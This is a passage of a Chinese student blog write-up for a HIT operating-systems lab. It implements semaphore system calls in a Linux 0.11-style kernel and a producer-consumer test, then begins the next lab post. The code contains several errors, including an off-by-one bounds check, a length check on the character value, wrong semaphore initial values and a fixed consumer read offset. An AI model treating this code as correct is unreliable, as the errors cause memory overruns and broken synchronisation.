<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_sem_open</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_sem_wait</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_sem_post</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">sys_sem_unlink</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">fn_ptr sys_call_table[] = &#123;......,sys_sem_open,sys_sem_wait,sys_sem_post,sys_sem_unlink&#125;;</span><br></pre></td></tr></table></figure>
<p>头文件以及全局变量：（在 <code>/kernel</code> 中新建文件 <code>sem.c</code>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __LIBRARY__  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/segment.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/system.h&gt;</span>   </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEM_COUNT 32 </span></span><br><span class="line"><span class="keyword">sem_t</span> semaphores[SEM_COUNT]; </span><br></pre></td></tr></table></figure>
<p>基础字符串函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcmp_sem</span><span class="params">(<span class="keyword">char</span>* name,<span class="keyword">char</span>* tmp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">20</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(name[i] != tmp[i]) </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(tmp[i] ==<span class="string">&#x27;\0&#x27;</span> &amp;&amp; name[i] == <span class="string">&#x27;\0&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcpy_sem</span><span class="params">(<span class="keyword">char</span>* name,<span class="keyword">char</span>* tmp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">20</span>; i++)&#123;</span><br><span class="line">		name[i] = tmp[i];</span><br><span class="line">        <span class="keyword">if</span>(tmp[i] ==<span class="string">&#x27;\0&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>插入 / 获取 <code>task_struct</code> 结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct task_struct * <span class="title">get_task</span><span class="params">(<span class="keyword">sem_t</span>* q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(q-&gt;wait_queue.front == q-&gt;wait_queue.rear) &#123;</span><br><span class="line">        printk(<span class="string">&quot;Queue is empty!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span> =</span> q-&gt;wait_queue.wait_tasks[q-&gt;wait_queue.front]; </span><br><span class="line">	q-&gt;wait_queue.front = (q-&gt;wait_queue.front+<span class="number">1</span>)%QUE_LEN;</span><br><span class="line">	<span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">insert_task</span><span class="params">(struct task_struct *p,<span class="keyword">sem_t</span>* q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((q-&gt;wait_queue.rear+<span class="number">1</span>)%QUE_LEN == q-&gt;wait_queue.front)&#123;</span><br><span class="line">		printk(<span class="string">&quot;Queue is full!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	q-&gt;wait_queue.wait_tasks[q-&gt;wait_queue.rear] = p;</span><br><span class="line">	q-&gt;wait_queue.rear = (q-&gt;wait_queue.rear+<span class="number">1</span>)%QUE_LEN;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用静态队列 FIFO</li>
</ul>
<p>系统调用 sys_sem_open：打开一个信号量文件描述符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_sem_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name,<span class="keyword">unsigned</span> <span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i&lt;<span class="number">20</span>; i++)&#123;</span><br><span class="line">        c = get_fs_byte(name+i);</span><br><span class="line">        tmp[i] = c;</span><br><span class="line">        <span class="keyword">if</span>(c ==<span class="string">&#x27;\0&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(c &gt;= <span class="number">20</span>) &#123; 	</span><br><span class="line">        printk(<span class="string">&quot;Semaphore name is too long!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; SEM_COUNT; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strcmp_sem(&amp;semaphores[i].name,tmp))&#123;</span><br><span class="line">            printk(<span class="string">&quot;sem %s is exist\n&quot;</span>, semaphores[i].name);</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; SEM_COUNT; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(semaphores[i].name[<span class="number">0</span>] == <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">            strcpy_sem(semaphores[i].name,tmp);</span><br><span class="line">            semaphores[i].value = value;</span><br><span class="line">            semaphores[i].wait_queue.front = <span class="number">0</span>;</span><br><span class="line">            semaphores[i].wait_queue.rear = <span class="number">0</span>; </span><br><span class="line">            printk(<span class="string">&quot;create sem %s done\n&quot;</span>,tmp);</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;	</span><br><span class="line">    printk(<span class="string">&quot;Numbers of semaphores are limited!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p>系统调用 sys_sem_wait：P 操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_sem_wait</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    cli();</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt; SEM_COUNT)&#123;</span><br><span class="line">        sti();</span><br><span class="line">        printk(<span class="string">&quot;sem (P) error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">sem_t</span>* sem = &amp;semaphores[i];</span><br><span class="line">    sem-&gt;value--;</span><br><span class="line">    <span class="keyword">if</span>(sem-&gt;value &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		current-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">		insert_task(current,sem);</span><br><span class="line">        schedule();</span><br><span class="line">    &#125;</span><br><span class="line">    sti();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>系统调用 sys_sem_post：V 操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_sem_post</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cli();</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt; SEM_COUNT)&#123;</span><br><span class="line">        sti();</span><br><span class="line">        printk(<span class="string">&quot;sem (V) error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">sem_t</span>* sem = &amp;semaphores[i];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	sem-&gt;value++;</span><br><span class="line">	<span class="keyword">if</span>(sem-&gt;value &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">		p = get_task(sem);</span><br><span class="line">		<span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            p-&gt;state = TASK_RUNNING;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	sti();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>系统调用 sys_sem_unlink：删除一个信号量文件描述符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_sem_unlink</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>( i = <span class="number">0</span>; i&lt;<span class="number">20</span>; i++)&#123;</span><br><span class="line">		c = get_fs_byte(name+i);</span><br><span class="line">		tmp[i] = c;</span><br><span class="line">		<span class="keyword">if</span>(c ==<span class="string">&#x27;\0&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(c &gt;= <span class="number">20</span>) &#123;</span><br><span class="line">		printk(<span class="string">&quot;Semphore name is too long!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt; SEM_COUNT; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(semaphores[i].name,tmp) == <span class="number">0</span>)&#123;</span><br><span class="line">            printk(<span class="string">&quot;sem %s is unlinked\n&quot;</span>,semaphores[i].name);</span><br><span class="line">            semaphores[i].name[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            semaphores[i].value = <span class="number">0</span>;</span><br><span class="line">            semaphores[i].wait_queue.front = <span class="number">0</span>;</span><br><span class="line">            semaphores[i].wait_queue.rear = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;QUE_LEN; j++)&#123;</span><br><span class="line">                semaphores[i].wait_queue.wait_tasks[j] = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;	</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p>修改 makefile：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OBJS  = sched.o system_call.o traps.o asm.o fork.o \</span><br><span class="line">	panic.o printk.o vsprintf.o sys.o exit.o \</span><br><span class="line">	signal.o mktime.o sem.o</span><br><span class="line">	</span><br><span class="line">sem.s sem.o: sem.c ../<span class="keyword">include</span>/linux/kernel.h ../<span class="keyword">include</span>/unistd.h</span><br></pre></td></tr></table></figure>
<p>实验的最后我们需要使用信号量来解决生产者-消费者问题</p>
<p>消费者模型是一种用于描述消费者行为和系统性能的模型：系统中有一组生产者进程和一组消费者进程，生产者进程每次生产一个产品放入缓冲区，消费者每次从缓冲区中取出一个产品并使用，生产者、消费者共享一个初始为空、大小为 <code>n</code> 的缓冲区</p>
<ul>
<li>只有缓冲区没满时，生产者才能把产品放入缓冲区，否则必须等待</li>
<li>只有缓冲区不为空时，消费者才能从中取出产品，否则必须等待</li>
<li>缓冲区是临界资源，各进程必须互斥的访问</li>
</ul>
<p>生产者-消费者模型代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>   __LIBRARY__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">_syscall2(<span class="keyword">int</span>,sem_open,<span class="keyword">const</span> <span class="keyword">char</span> *,name,<span class="keyword">unsigned</span> <span class="keyword">int</span>,value);</span><br><span class="line">_syscall1(<span class="keyword">int</span>,sem_wait,<span class="keyword">int</span>,sem);</span><br><span class="line">_syscall1(<span class="keyword">int</span>,sem_post,<span class="keyword">int</span>,sem);</span><br><span class="line">_syscall1(<span class="keyword">int</span>,sem_unlink,<span class="keyword">const</span> <span class="keyword">char</span> *,name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> consumerNum = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> itemNum = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> bufSize = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> buf_in = <span class="number">0</span>,buf_out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sem_empty, sem_full, sem_mutex;</span><br><span class="line">    <span class="keyword">int</span> stat;</span><br><span class="line">    <span class="keyword">pid_t</span> p;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((sem_empty = sem_open(<span class="string">&quot;empty&quot;</span>,<span class="number">1</span>)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;empty error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((sem_full = sem_open(<span class="string">&quot;full&quot;</span>,<span class="number">0</span>)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;full error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((sem_mutex = sem_open(<span class="string">&quot;mutex&quot;</span>,<span class="number">10</span>)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mutex error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;buffer.dat&quot;</span>, O_CREAT | O_RDWR | O_TRUNC, <span class="number">0666</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(p = fork()))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A(%d) create\n&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; itemNum; i++)&#123;</span><br><span class="line">            sem_wait(sem_empty);</span><br><span class="line">            sem_wait(sem_mutex);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;A(%d) &gt;&gt; buf_in:%d\n&quot;</span>,<span class="number">0</span>,buf_in);</span><br><span class="line">            lseek(fd, buf_in * <span class="keyword">sizeof</span>(<span class="keyword">int</span>), SEEK_SET);</span><br><span class="line">            write(fd, (<span class="keyword">char</span> *)&amp;buf_in, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">            buf_in = (buf_in+<span class="number">1</span>) % bufSize;</span><br><span class="line"></span><br><span class="line">            sem_post(sem_mutex);</span><br><span class="line">            sem_post(sem_full);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A(%d) done\n&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(p &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;fork error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; consumerNum; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!(p = fork()))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;B(%d) create\n&quot;</span>,j);</span><br><span class="line">            <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; itemNum/consumerNum; k++)&#123;</span><br><span class="line">                sem_wait(sem_full);</span><br><span class="line">                sem_wait(sem_mutex);</span><br><span class="line"></span><br><span class="line">                lseek(fd, bufSize * <span class="keyword">sizeof</span>(<span class="keyword">int</span>), SEEK_SET);</span><br><span class="line">                read(fd, (<span class="keyword">char</span> *)&amp;buf_out, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;B(%d) &gt;&gt; buf_out:%d\n&quot;</span>,j,buf_out);</span><br><span class="line"></span><br><span class="line">                buf_out = (buf_out + <span class="number">1</span>) % bufSize;</span><br><span class="line">                lseek(fd, bufSize * <span class="keyword">sizeof</span>(<span class="keyword">int</span>), SEEK_SET);</span><br><span class="line">                write(fd, (<span class="keyword">char</span> *)&amp;buf_out, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"></span><br><span class="line">                sem_post(sem_mutex);</span><br><span class="line">                sem_post(sem_empty);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;B(%d) done\n&quot;</span>,j);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(p &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">&quot;fork error!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((wait(&amp;stat)) &gt; <span class="number">0</span>); </span><br><span class="line">    sem_unlink(<span class="string">&quot;empty&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;full&quot;</span>);</span><br><span class="line">    sem_unlink(<span class="string">&quot;mutex&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;all done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终效果如下：</p>
<img src="/2023/11/05/HIT-OSLab5/1699116801751.png" class width="1699116801751">  

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/02/HIT-OSLab4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/02/HIT-OSLab4/" class="post-title-link" itemprop="url">HIT-OSLab4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-02 20:58:12 / Modified: 20:59:00" itemprop="dateCreated datePublished" datetime="2023-11-02T20:58:12+08:00">2023-11-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>HIT-OSLab4</strong></p>
<p>实验目的：</p>
<ul>
<li>深入理解进程和进程切换的概念</li>
<li>综合应用进程、<code>CPU</code> 管理、<code>PCB</code>、<code>LDT</code>、内核栈、内核态等知识解决实际问题</li>
<li>开始建立系统认识</li>
</ul>
<p>实验内容：</p>
<ul>
